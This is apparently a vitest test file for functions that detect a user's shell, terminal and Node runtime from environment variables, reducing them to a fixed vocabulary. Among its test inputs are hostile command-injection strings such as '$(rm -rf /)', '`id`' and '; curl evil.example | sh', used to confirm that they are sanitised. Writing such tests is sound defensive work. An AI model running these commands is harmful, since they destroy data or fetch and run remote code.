import { afterEach, describe, expect, it, vi } from 'vitest'

import {
  OTHER,
  SHELLS,
  TERMINALS,
  UNKNOWN,
  detectEnvironment,
  detectShell,
  detectTerminal,
} from '../src/environment.js'
import { stubStdoutIsTty } from './stdoutTty.js'

afterEach(() => {
  vi.restoreAllMocks()
})

describe('detectShell', () => {
  it.each([
    ['/bin/bash', 'bash'],
    ['/usr/bin/zsh', 'zsh'],
    ['/usr/local/bin/fish', 'fish'],
    ['/bin/sh', 'sh'],
    ['/bin/dash', 'dash'],
    ['/bin/ksh', 'ksh'],
    ['/bin/tcsh', 'tcsh'],
    ['/bin/csh', 'csh'],
    ['/usr/bin/nu', 'nushell'],
    ['/usr/bin/elvish', 'elvish'],
    ['/usr/bin/xonsh', 'xonsh'],
    ['/usr/bin/pwsh', 'powershell'],
    ['/usr/bin/powershell', 'powershell'],
    ['/bin/cmd', 'cmd'],
  ])('maps $SHELL=%s to %s', (shell, expected) => {
    expect(detectShell({ SHELL: shell }, 'linux')).toBe(expected)
  })

  it('maps only the basename, never reporting the path', () => {
    expect(detectShell({ SHELL: '/home/alice/secret-project/bin/zsh' }, 'linux')).toBe('zsh')
    expect(detectShell({ SHELL: '/home/alice/secret-project/bin/mysh' }, 'linux')).toBe(OTHER)
  })

  it('handles Windows paths, case and .exe, on any platform', () => {
    expect(detectShell({ SHELL: 'C:\\Program Files\\Git\\usr\\bin\\BASH.EXE' }, 'win32')).toBe(
      'bash',
    )
    expect(detectShell({ SHELL: 'C:\\Windows\\System32\\pwsh.exe' }, 'linux')).toBe('powershell')
  })

  it('handles a login-shell dash prefix', () => {
    expect(detectShell({ SHELL: '-zsh' }, 'darwin')).toBe('zsh')
  })

  it('reports other for a shell outside the vocabulary', () => {
    expect(detectShell({ SHELL: '/opt/tools/my-custom-shell' }, 'linux')).toBe(OTHER)
  })

  it.each(['__proto__', 'constructor', 'toString', 'hasOwnProperty', '/bin/__proto__'])(
    'treats the prototype-ish value %s as other',
    (value) => {
      expect(detectShell({ SHELL: value }, 'linux')).toBe(OTHER)
    },
  )

  it('never returns raw garbage', () => {
    const garbage = [
      '$(rm -rf /)',
      '`id`',
      '; curl evil.example | sh',
      'x'.repeat(5000),
      '\u0000\u202e',
      '../../..//',
      ' ',
    ]
    for (const value of garbage) {
      expect(detectShell({ SHELL: value }, 'linux')).toBe(OTHER)
    }
  })

  it('is undefined without $SHELL off Windows', () => {
    expect(detectShell({}, 'linux')).toBeUndefined()
    expect(detectShell({ SHELL: '' }, 'darwin')).toBeUndefined()
    // Windows-only variables are ignored elsewhere.
    expect(detectShell({ ComSpec: 'C:\\Windows\\System32\\cmd.exe' }, 'linux')).toBeUndefined()
  })

  describe('on Windows without $SHELL', () => {
    it('detects PowerShell from PSModulePath when PROMPT is unset', () => {
      expect(detectShell({ PSModulePath: 'C:\\x', ComSpec: 'C:\\cmd.exe' }, 'win32')).toBe(
        'powershell',
      )
    })

    it('detects cmd when PROMPT is set, even with PSModulePath', () => {
      expect(
        detectShell({ PSModulePath: 'C:\\x', PROMPT: '$P$G', ComSpec: 'C:\\cmd.exe' }, 'win32'),
      ).toBe('cmd')
    })

    it('detects cmd from ComSpec alone', () => {
      expect(detectShell({ ComSpec: 'C:\\Windows\\System32\\cmd.exe' }, 'win32')).toBe('cmd')
    })

    it('is undefined with no markers', () => {
      expect(detectShell({}, 'win32')).toBeUndefined()
    })

    it('prefers $SHELL (Git Bash, MSYS)', () => {
      expect(detectShell({ SHELL: '/usr/bin/bash', ComSpec: 'C:\\cmd.exe' }, 'win32')).toBe('bash')
    })
  })
})

describe('detectTerminal', () => {
  it.each([
    ['Apple_Terminal', 'apple-terminal'],
    ['iTerm.app', 'iterm2'],
    ['vscode', 'vscode'],
    ['WezTerm', 'wezterm'],
    ['ghostty', 'ghostty'],
    ['Hyper', 'hyper'],
    ['WarpTerminal', 'warp'],
    ['zed', 'zed'],
    ['rio', 'rio'],
    ['tmux', 'tmux'],
  ])('maps TERM_PROGRAM=%s to %s', (program, expected) => {
    expect(detectTerminal({ TERM_PROGRAM: program })).toBe(expected)
  })

  it.each([
    ['WT_SESSION', 'windows-terminal'],
    ['KITTY_WINDOW_ID', 'kitty'],
    ['WEZTERM_EXECUTABLE', 'wezterm'],
    ['GHOSTTY_RESOURCES_DIR', 'ghostty'],
    ['KONSOLE_VERSION', 'konsole'],
    ['ITERM_SESSION_ID', 'iterm2'],
    ['VTE_VERSION', 'vte'],
    ['XTERM_VERSION', 'xterm'],
    ['ALACRITTY_LOG', 'alacritty'],
    ['ALACRITTY_SOCKET', 'alacritty'],
    ['ALACRITTY_WINDOW_ID', 'alacritty'],
    ['TMUX', 'tmux'],
    ['STY', 'screen'],
  ])('maps the %s marker to %s', (name, expected) => {
    expect(detectTerminal({ [name]: 'anything-at-all' })).toBe(expected)
  })

  it('reports unknown when no marker is present', () => {
    expect(detectTerminal({})).toBe(UNKNOWN)
    expect(detectTerminal({ PATH: '/bin', HOME: '/home/alice', TERM: 'xterm-256color' })).toBe(
      UNKNOWN,
    )
  })

  it('reports other for a TERM_PROGRAM outside the vocabulary', () => {
    expect(detectTerminal({ TERM_PROGRAM: 'MyHomegrownTerm' })).toBe(OTHER)
  })

  it('ignores empty markers', () => {
    expect(detectTerminal({ WT_SESSION: '', TERM_PROGRAM: '', TMUX: '', ALACRITTY_LOG: '' })).toBe(
      UNKNOWN,
    )
  })

  it('is case-sensitive for TERM_PROGRAM', () => {
    expect(detectTerminal({ TERM_PROGRAM: 'VSCODE' })).toBe(OTHER)
  })

  it('never forwards TERM, even alongside a known marker', () => {
    expect(detectTerminal({ TERM: 'xterm-kitty' })).toBe(UNKNOWN)
    expect(detectTerminal({ TERM: 'my-secret-term', KITTY_WINDOW_ID: '1' })).toBe('kitty')
  })

  it('prefers a terminal-specific marker over TERM_PROGRAM, and that over a multiplexer', () => {
    expect(detectTerminal({ WT_SESSION: 'x', TERM_PROGRAM: 'vscode', TMUX: '/tmp/tmux' })).toBe(
      'windows-terminal',
    )
    expect(detectTerminal({ TERM_PROGRAM: 'vscode', TMUX: '/tmp/tmux-1000/default,1,0' })).toBe(
      'vscode',
    )
    expect(detectTerminal({ TMUX: '/tmp/tmux-1000/default,1,0', STY: '1.pts' })).toBe('tmux')
  })

  it.each(['__proto__', 'constructor', 'toString', '$(id)', 'x'.repeat(5000), '\u0000'])(
    'reduces the spoofed TERM_PROGRAM %j to other',
    (value) => {
      expect(detectTerminal({ TERM_PROGRAM: value })).toBe(OTHER)
    },
  )

  it('only ever returns a vocabulary value, other or unknown', () => {
    const allowed = new Set([...TERMINALS, OTHER, UNKNOWN])
    const envs = [
      {},
      { TERM_PROGRAM: 'garbage' },
      { TERM_PROGRAM: '/home/alice/bin/term' },
      { VTE_VERSION: '/etc/passwd' },
      { WT_SESSION: 'user@host' },
      { ALACRITTY_SOCKET: '/run/user/1000/alacritty.sock' },
    ]
    for (const env of envs) {
      const terminal = detectTerminal(env)
      expect(allowed.has(terminal)).toBe(true)
      expect(terminal.length).toBeLessThanOrEqual(32)
    }
  })
})

describe('vocabularies', () => {
  it('fit the server limit of 32 characters and are plain identifiers', () => {
    for (const value of [...SHELLS, ...TERMINALS, OTHER, UNKNOWN]) {
      expect(value.length).toBeLessThanOrEqual(32)
      expect(value).toMatch(/^[a-z0-9][a-z0-9-]*$/)
    }
  })

  it('contains the issue-listed shells', () => {
    for (const shell of ['bash', 'zsh', 'fish', 'sh', 'powershell', 'cmd']) {
      expect(SHELLS).toContain(shell)
    }
  })
})

describe('detectEnvironment', () => {
  it('reports node and its version', () => {
    const detected = detectEnvironment({}, 'linux')
    expect(detected.runtimeName).toBe('node')
    expect(detected.runtimeVersion).toBe(process.versions.node)
  })

  it('reports a TTY only when stdout.isTTY is exactly true', () => {
    for (const [value, expected] of [
      [true, true],
      [false, false],
      [undefined, false],
      ['true', false],
      [1, false],
    ] as const) {
      const restore = stubStdoutIsTty(value)
      try {
        expect(detectEnvironment({}, 'linux').stdoutIsTty).toBe(expected)
      } finally {
        restore()
      }
    }
  })

  it('omits the TTY fact when stdout cannot be read', () => {
    vi.spyOn(process, 'stdout', 'get').mockImplementation(() => {
      throw new Error('boom')
    })
    const detected = detectEnvironment({}, 'linux')
    expect(detected).not.toHaveProperty('stdoutIsTty')
    expect(detected.runtimeName).toBe('node')
  })

  it('omits the runtime when the version is missing or malformed', () => {
    const versions = vi.spyOn(process, 'versions', 'get')
    for (const node of [
      undefined,
      '',
      '/usr/local/bin/node',
      '22.1.0 (host-name)',
      '1'.repeat(40),
    ]) {
      versions.mockReturnValue({ ...process.versions, node } as never)
      const detected = detectEnvironment({}, 'linux')
      expect(detected).not.toHaveProperty('runtimeName')
      expect(detected).not.toHaveProperty('runtimeVersion')
    }
  })

  it('accepts a prerelease Node version', () => {
    vi.spyOn(process, 'versions', 'get').mockReturnValue({
      ...process.versions,
      node: '24.0.0-nightly20250101abc',
    } as never)
    expect(detectEnvironment({}, 'linux').runtimeVersion).toBe('24.0.0-nightly20250101abc')
  })

  it('omits the shell without one, but still reports the terminal', () => {
    const detected = detectEnvironment({ TERM_PROGRAM: 'vscode' }, 'linux')
    expect(detected).not.toHaveProperty('shell')
    expect(detected.terminal).toBe('vscode')
  })

  it('never throws on a hostile env object', () => {
    const hostile = new Proxy(
      {},
      {
        get() {
          throw new Error('boom')
        },
        ownKeys() {
          throw new Error('boom')
        },
      },
    )
    expect(() => detectEnvironment(hostile as never, 'linux')).not.toThrow()
    expect(detectEnvironment(hostile as never, 'linux').runtimeName).toBe('node')
  })
})
